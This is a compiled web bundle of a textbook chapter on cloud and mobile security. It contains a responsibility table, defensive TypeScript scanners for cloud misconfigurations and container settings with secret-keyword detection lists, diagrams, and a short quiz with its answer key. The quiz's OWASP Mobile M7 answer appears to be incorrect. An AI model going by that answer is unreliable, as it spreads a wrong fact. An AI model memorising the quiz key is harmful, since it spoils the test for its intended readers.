            children: "AWS Client VPN + Mobile device"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data Protection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KMS, S3 server-side encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Keychain, Keystore, EncryptedSharedPreferences"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KMS + mobile SDK encryption"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Monitoring"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudTrail, CloudWatch"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Crashlytics, Firebase Analytics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudWatch + mobile telemetry"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CIS benchmarks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MDM compliance policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Config + MDM policy sync"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Incident Response"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GuardDuty, Security Hub"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Play Integrity, App attestation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM + mobile threat feed"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-quiz",
      children: "Chapter Quiz"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Question"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "A"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "B"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "C"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "D"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Answer"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "In IaaS, who patches the guest OS?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shared between provider and customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No one — IaaS doesn't have guest OS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which tool runs a CIS benchmark against a Kubernetes cluster?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "kube-bench"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "kube-hunter"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trivy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Falco"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The Capital One 2019 breach was caused by:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQL injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSRF to EC2 metadata endpoint"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weak S3 bucket password"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compromised employee credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP Mobile Top 10 M7 is:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Communication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Data Storage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improper Platform Usage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insufficient Cryptography"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which Android component enforces mandatory access control?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android Permission Manager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SELinux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Google Play Protect"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SafetyNet"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What does CIEM focus on?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Container image vulnerability scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud IAM permissions management at scale"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud workload anti-malware protection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud network security group management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The FORCEDENTRY exploit targeted which iOS component?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Safari WebKit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CoreGraphics PDF parser"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iMessage BlastDoor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure Enclave"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "typescript-implementations",
      children: "TypeScript Implementations"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cloud-security-posture-scanner",
      children: "Cloud Security Posture Scanner"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Cloud Security Posture Scanner\n *\n * Scans cloud resources for common misconfigurations and compliance violations\n * based on the Shared Responsibility Model and CIS benchmarks.\n * Checks include: public S3 buckets, unencrypted EBS volumes, security groups\n * with 0.0.0.0/0 ingress, and missing MFA on root accounts.\n */\n\ninterface CloudResource {\n  id: string;\n  type: string;\n  config: Record<string, unknown>;\n  region: string;\n  tags: Record<string, string>;\n}\n\ninterface ComplianceFinding {\n  resourceId: string;\n  rule: string;\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  description: string;\n  remediation: string;\n}\n\nclass CloudPostureScanner {\n  private rules: Map<string, (resource: CloudResource) => ComplianceFinding | null>;\n\n  constructor() {\n    this.rules = new Map();\n    this.registerBuiltinRules();\n  }\n\n  private registerBuiltinRules(): void {\n    // Rule 1: Check for public S3 buckets (BucketPolicy allowing *)\n    this.rules.set('s3-public-bucket', (resource: CloudResource) => {\n      if (resource.type !== 's3-bucket') return null;\n      const policy = resource.config['bucketPolicy'] as string;\n      if (policy && policy.includes('\"Principal\": \"*\"')) {\n        return {\n          resourceId: resource.id,\n          rule: 'S3-PUBLIC-001',\n          severity: 'critical',\n          description: `S3 bucket ${resource.id} has a bucket policy allowing public access`,\n          remediation:\n            'Remove the Principal: \"*\" statement and use specific IAM roles or AWS accounts',\n        };\n      }\n      return null;\n    });\n\n    // Rule 2: Check for unencrypted EBS volumes\n    this.rules.set('ebs-unencrypted', (resource: CloudResource) => {\n      if (resource.type !== 'ebs-volume') return null;\n      if (!resource.config['encrypted']) {\n        return {\n          resourceId: resource.id,\n          rule: 'EBS-ENCRYPT-001',\n          severity: 'high',\n          description: `EBS volume ${resource.id} is not encrypted at rest`,\n          remediation:\n            'Enable EBS encryption by default in the region or create an encrypted copy of the volume',\n        };\n      }\n      return null;\n    });\n\n    // Rule 3: Check for security groups with 0.0.0.0/0\n    this.rules.set('sg-wide-open', (resource: CloudResource) => {\n      if (resource.type !== 'security-group') return null;\n      const ingressRules = resource.config['ipPermissions'] as Array<{\n        ipRanges: Array<{ cidrIp: string }>;\n        fromPort: number;\n        toPort: number;\n        ipProtocol: string;\n      }>;\n      if (!ingressRules) return null;\n      for (const rule of ingressRules) {\n        for (const range of rule.ipRanges || []) {\n          if (\n            range.cidrIp === '0.0.0.0/0' &&\n            rule.fromPort !== 443 &&\n            rule.fromPort !== 80\n          ) {\n            return {\n              resourceId: resource.id,\n              rule: 'SG-RESTRICT-001',\n              severity: 'high',\n              description: `Security group ${resource.id} allows 0.0.0.0/0 on port ${rule.fromPort}`,\n              remediation:\n                'Restrict ingress to known IP ranges or use a load balancer for public traffic',\n            };\n          }\n        }\n      }\n      return null;\n    });\n\n    // Rule 4: Check for no MFA on root account\n    this.rules.set('root-no-mfa', (resource: CloudResource) => {\n      if (resource.type !== 'iam-user') return null;\n      if (resource.config['userName'] === 'root' && !resource.config['mfaEnabled']) {\n        return {\n          resourceId: resource.id,\n          rule: 'IAM-MFA-001',\n          severity: 'critical',\n          description: 'Root account does not have MFA enabled',\n          remediation:\n            'Enable MFA for the root account immediately via the AWS IAM console',\n        };\n      }\n      return null;\n    });\n  }\n\n  /** Registers a custom rule at runtime */\n  addRule(\n    name: string,\n    fn: (resource: CloudResource) => ComplianceFinding | null\n  ): void {\n    this.rules.set(name, fn);\n  }\n\n  /** Runs all registered rules against the given resources */\n  scan(resources: CloudResource[]): ComplianceFinding[] {\n    const findings: ComplianceFinding[] = [];\n    for (const resource of resources) {\n      for (const [, ruleFn] of this.rules) {\n        const finding = ruleFn(resource);\n        if (finding) {\n          findings.push(finding);\n        }\n      }\n    }\n    return findings;\n  }\n}\n\n// --- Example usage ---\nconst scanner = new CloudPostureScanner();\nconst resources: CloudResource[] = [\n  {\n    id: 'my-bucket',\n    type: 's3-bucket',\n    config: {\n      bucketPolicy:\n        '{\"Statement\":[{\"Principal\":\"*\",\"Effect\":\"Allow\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::my-bucket/*\"}]}',\n    },\n    region: 'us-east-1',\n    tags: { Environment: 'Production' },\n  },\n  {\n    id: 'vol-abc123',\n    type: 'ebs-volume',\n    config: { encrypted: false, size: 100 },\n    region: 'us-west-2',\n    tags: {},\n  },\n  {\n    id: 'sg-web',\n    type: 'security-group',\n    config: {\n      ipPermissions: [\n        {\n          ipRanges: [{ cidrIp: '0.0.0.0/0' }],\n          fromPort: 22,\n          toPort: 22,\n          ipProtocol: 'tcp',\n        },\n      ],\n    },\n    region: 'eu-central-1',\n    tags: {},\n  },\n  {\n    id: 'root-account',\n    type: 'iam-user',\n    config: { userName: 'root', mfaEnabled: false },\n    region: 'global',\n    tags: {},\n  },\n];\n\nconst findings = scanner.scan(resources);\nconsole.log(`Found ${findings.length} compliance violations:`);\nfindings.forEach((f) =>\n  console.log(`  [${f.severity.toUpperCase()}] ${f.rule}: ${f.description}`)\n);\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "container-security-scanner",
      children: "Container Security Scanner"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "/**\n * Container Security Scanner\n *\n * Analyzes container images and runtime configurations for common security\n * misconfigurations including root execution, privileged mode, exposed secrets,\n * and missing security profiles (AppArmor, seccomp).\n */\n\ninterface ContainerImage {\n  layers: string[];\n  exposedPorts: number[];\n  envVars: string[];\n  entrypoint: string;\n  user?: string;\n  privileged?: boolean;\n  appArmorProfile?: string;\n  seccompProfile?: string;\n  readOnlyRootFilesystem?: boolean;\n  capabilities?: string[];\n}\n\ninterface ContainerVuln {\n  cve: string;\n  severity: string;\n  package: string;\n  fixVersion: string;\n}\n\nclass ContainerScanner {\n  /** Scans image layers for known CVEs from a simulated vulnerability database */\n  scanImage(image: ContainerImage): ContainerVuln[] {\n    const vulns: ContainerVuln[] = [];\n\n    // Simulated CVE database keyed by base image layer name\n    const cveDatabase = new Map<string, ContainerVuln[]>([\n      [\n        'alpine:3.14',\n        [\n          {\n            cve: 'CVE-2024-1234',\n            severity: 'HIGH',\n            package: 'libssl1.1',\n            fixVersion: '1.1.1w-r0',\n          },\n        ],\n      ],\n      [\n        'ubuntu:20.04',\n        [\n          {\n            cve: 'CVE-2024-5678',\n            severity: 'MEDIUM',\n            package: 'libpam-modules',\n            fixVersion: '1.3.1-5ubuntu4.7',\n          },\n        ],\n      ],\n      [\n        'node:18-alpine',\n        [\n          {\n            cve: 'CVE-2024-9012',\n            severity: 'CRITICAL',\n            package: 'npm',\n            fixVersion: '9.8.1-r0',\n          },\n        ],\n      ],\n    ]);\n\n    for (const layer of image.layers) {\n      const layerVulns = cveDatabase.get(layer);\n      if (layerVulns) {\n        vulns.push(...layerVulns);\n      }\n    }\n    return vulns;\n  }\n\n  /** Checks runtime configuration against CIS Docker Benchmark recommendations */\n  checkConfig(image: ContainerImage): string[] {\n    const issues: string[] = [];\n\n    // Check 1: Running as root (CIS 4.1)\n    if (!image.user || image.user === 'root') {\n      issues.push(\n        'CRITICAL: Container runs as root — use a non-root user directive (USER 1000)'\n      );\n    }\n\n    // Check 2: Privileged mode (CIS 5.1)\n    if (image.privileged) {\n      issues.push(\n        'CRITICAL: Privileged mode enabled — grants all host capabilities, bypassing namespace isolation'\n      );\n    }\n\n    // Check 3: Sensitive environment variables\n    const sensitivePatterns = [\n      'PASSWORD',\n      'SECRET',\n      'TOKEN',\n      'API_KEY',\n      'CREDENTIAL',\n      'AUTH',\n      'PRIVATE_KEY',\n    ];\n    for (const env of image.envVars) {\n      const key = env.split('=')[0];\n      for (const pattern of sensitivePatterns) {\n        if (key.toUpperCase().includes(pattern)) {\n          issues.push(\n            `HIGH: Potential secret exposure in env var \"${key}\" — use Docker secrets or a vault`\n          );\n          break;\n        }\n      }\n    }\n\n    // Check 4: Exposed Docker socket (CIS 6.1)\n    if (image.exposedPorts.includes(2375) || image.exposedPorts.includes(2376)) {\n      issues.push(\n        'CRITICAL: Docker socket exposed (port 2375/2376) — host compromise via container escape'\n      );\n    }\n\n    // Check 5: Missing AppArmor profile (CIS 5.9)\n    if (!image.appArmorProfile) {\n      issues.push(\n        'MEDIUM: No AppArmor profile applied — consider docker-default or a custom profile'\n      );\n    }\n\n    // Check 6: Missing seccomp profile (CIS 5.8)\n    if (!image.seccompProfile) {\n      issues.push(\n        'MEDIUM: No seccomp profile applied — restrict syscalls with a default or custom profile'\n      );\n    }\n\n    // Check 7: Writable root filesystem (CIS 5.12)\n    if (!image.readOnlyRootFilesystem) {\n      issues.push(\n        'MEDIUM: Root filesystem is writable — set readOnlyRootFilesystem: true and mount tmpfs for temp data'\n      );\n    }\n\n    // Check 8: Dangerous capabilities (CIS 5.3–5.7)\n    const dangerousCaps = [\n      'SYS_ADMIN',\n      'NET_ADMIN',\n      'SYS_PTRACE',\n      'SYS_MODULE',\n      'SYS_RAWIO',\n      'DAC_OVERRIDE',\n    ];\n    for (const cap of image.capabilities || []) {\n      if (dangerousCaps.includes(cap)) {\n        issues.push(\n          `HIGH: Dangerous capability \"${cap}\" granted — drop all (--cap-drop=ALL) and add only required caps`\n        );\n      }\n    }\n\n    return issues;\n  }\n}\n\n// --- Example usage ---\nconst scanner = new ContainerScanner();\nconst image: ContainerImage = {\n  layers: ['ubuntu:20.04', 'node:18-alpine'],\n  exposedPorts: [80, 443, 2375],\n  envVars: [\n    'NODE_ENV=production',\n    'DB_PASSWORD=s3cret!',\n    'API_SECRET_TOKEN=abc123def456',\n  ],\n  entrypoint: '/app/server',\n  user: 'root',\n  privileged: true,\n  readOnlyRootFilesystem: false,\n  capabilities: ['SYS_ADMIN', 'NET_BIND_SERVICE', 'SYS_PTRACE'],\n};\n\n// Run vulnerability scan\nconst vulns = scanner.scanImage(image);\nconsole.log(`Found ${vulns.length} CVEs in image layers:`);\nvulns.forEach((v) =>\n  console.log(`  ${v.cve} (${v.severity}) — ${v.package} → fix: ${v.fixVersion}`)\n);\n\n// Run configuration audit\nconst configIssues = scanner.checkConfig(image);\nconsole.log(`\\nFound ${configIssues.length} configuration issues:`);\nconfigIssues.forEach((i) => console.log(`  ${i}`));\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mermaid-diagrams",
      children: "Mermaid Diagrams"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cloud-shared-responsibility-model-1",
      children: "Cloud Shared Responsibility Model"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TD\n    subgraph IaaS[\"IaaS (e.g., AWS EC2)\"]\n        direction LR\n        C1[\"<b>Customer Manages:</b><br/>Applications<br/>Data<br/>Runtime<br/>OS patches<br/>Firewall rules\"]\n        P1[\"<b>Provider Manages:</b><br/>Hypervisor<br/>Physical servers<br/>Network infra<br/>Datacenter HVAC\"]\n    end\n    subgraph PaaS[\"PaaS (e.g., AWS RDS)\"]\n        direction LR\n        C2[\"<b>Customer Manages:</b><br/>Application code<br/>Data<br/>Access policies<br/>Schema design\"]\n        P2[\"<b>Provider Manages:</b><br/>OS updates<br/>Runtime engine<br/>Middleware<br/>Hardware\"]\n    end\n    subgraph SaaS[\"SaaS (e.g., Salesforce)\"]\n        direction LR\n        C3[\"<b>Customer Manages:</b><br/>User access<br/>Data classification<br/>Configuration\"]\n        P3[\"<b>Provider Manages:</b><br/>Application code<br/>Platform security<br/>Infrastructure<br/>Compliance\"]\n    end\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mobile-app-sandbox-architecture",
      children: "Mobile App Sandbox Architecture"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart TD\n    subgraph iOS[\"iOS Security Model\"]\n        App1_iOS[\"App A<br/><i>Sandboxed</i>\"] -->|\"Seatbelt Profile\"| iOS_Kernel[\"XNU Kernel<br/>+ AMFI\"]\n        App2_iOS[\"App B<br/><i>Sandboxed</i>\"] -->|\"Seatbelt Profile\"| iOS_Kernel\n        iOS_Kernel -->|\"Entitlement Check\"| SecureEnclave[\"Secure Enclave<br/>(Crypto/Key ops)\"]\n        iOS_Kernel -->|\"Code Signing\"| CodeSign[\"Code Signing<br/>Validator\"]\n    end\n    subgraph Android[\"Android Security Model\"]\n        App1_Android[\"App A<br/><i>SELinux Context</i>\"] -->|\"MAC Policy\"| LinuxKernel[\"Linux Kernel<br/>+ SELinux\"]\n        App2_Android[\"App B<br/><i>SELinux Context</i>\"] -->|\"MAC Policy\"| LinuxKernel\n        LinuxKernel -->|\"Permission Check\"| PermissionMgr[\"Permission Manager\"]\n        LinuxKernel -->|\"UID Isolation\"| UIDIsolation[\"UID-based<br/>Sandboxing\"]\n    end\n    subgraph IPC[\"Inter-Process Communication\"]\n        IPC_Restrict[\"<b>Restricted by design:</b><br/>• iOS: XPC services only<br/>• Android: Binder with permission checks<br/>• No shared memory between apps\"]\n    end\n    iOS_Kernel -.-> IPC_Restrict\n    LinuxKernel -.-> IPC_Restrict\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "further-reading",
      children: "Further Reading"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "NIST SP 800-145"
        }), " — NIST Definition of Cloud Computing"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "OWASP Serverless Top 10"
        }), " — Serverless security risks and mitigations"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "OWASP Mobile Top 10 (2024)"
        }), " — Mobile application security risks"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CIS Benchmarks"
        }), " — aws.cisecurity.org, azure.cisecurity.org, gcp.cisecurity.org"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "NSA/CISA Kubernetes Hardening Guidance"
        }), " — K8s security best practices (August 2021, updated 2022)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Falco Documentation"
        }), " — Runtime security and rule authoring"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MITRE ATT&CK: Cloud Matrix"
        }), " — Cloud-specific adversary techniques"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Amnesty International Pegasus Project"
        }), " — Mobile spyware investigation reports"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Aqua Security Trivy Documentation"
        }), " — Container and K8s vulnerability scanning"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Apple Platform Security Guide"
        }), " — iOS security architecture deep dive"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Android Security and Privacy"
        }), " — AOSP security documentation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "dolosgroup.io/blog/capital-one-breach"
        }), " — Deep dive into Capital One 2019"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.em, {
        children: "End of Chapter 7 — Cloud & Mobile Security"
      })
    })]
  });
}
function MDXContent(props = {}) {
  const {wrapper: MDXLayout} = {
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
    ...props,
    children: (0,jsx_runtime.jsx)(_createMdxContent, {
      ...props
    })
  }) : _createMdxContent(props);
}



/***/ },

/***/ 28453
(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   R: () => (/* binding */ useMDXComponents),
/* harmony export */   x: () => (/* binding */ MDXProvider)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
/**
 * @import {MDXComponents} from 'mdx/types.js'
 * @import {Component, ReactElement, ReactNode} from 'react'
 */

/**
 * @callback MergeComponents
 *   Custom merge function.
 * @param {Readonly<MDXComponents>} currentComponents
 *   Current components from the context.
 * @returns {MDXComponents}
 *   Additional components.
 *
 * @typedef Props
 *   Configuration for `MDXProvider`.
 * @property {ReactNode | null | undefined} [children]
 *   Children (optional).
 * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @property {boolean | null | undefined} [disableParentContext=false]
 *   Turn off outer component context (default: `false`).
 */



/** @type {Readonly<MDXComponents>} */
const emptyComponents = {}

const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)

/**
 * Get current components from the MDX Context.
 *
 * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @returns {MDXComponents}
 *   Current components.
 */
function useMDXComponents(components) {
  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)

  // Memoize to avoid unnecessary top-level context changes
  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
    function () {
      // Custom merge via a function prop
      if (typeof components === 'function') {
        return components(contextComponents)
      }

      return {...contextComponents, ...components}
    },
    [contextComponents, components]
  )
}

/**
 * Provider for MDX context.
 *
 * @param {Readonly<Props>} properties
 *   Properties.
 * @returns {ReactElement}
 *   Element.
 * @satisfies {Component}
 */
function MDXProvider(properties) {
  /** @type {Readonly<MDXComponents>} */
  let allComponents

  if (properties.disableParentContext) {
    allComponents =
      typeof properties.components === 'function'
        ? properties.components(emptyComponents)
        : properties.components || emptyComponents
  } else {
    allComponents = useMDXComponents(properties.components)
  }

  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
    MDXContext.Provider,
    {value: allComponents},
    properties.children
  )
}


/***/ }

}]);